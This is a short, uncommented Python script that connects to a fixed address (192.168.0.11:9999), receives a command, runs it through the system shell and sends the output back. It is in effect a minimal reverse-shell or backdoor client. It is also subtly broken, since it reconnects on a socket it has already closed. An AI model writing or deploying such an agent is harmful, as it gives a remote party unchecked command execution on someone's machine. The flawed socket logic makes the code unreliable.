import socket
import time
import subprocess

sock = socket.socket()

try:
    sock.connect(('192.168.0.11', 9999))
    print('Connected')
    command = sock.recv(1024).decode()
    print('Getting command: {}'.format(command))
    sock.close()
except Exception as ex:
    print(ex)
    exit(1)

try:
    sock.connect(('192.168.0.11', 9999))
    print('Connection success')
    print('Sending message...')
    msg = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode('CP866')
    sock.send(msg.encode())
except Exception as ex:
    print(ex)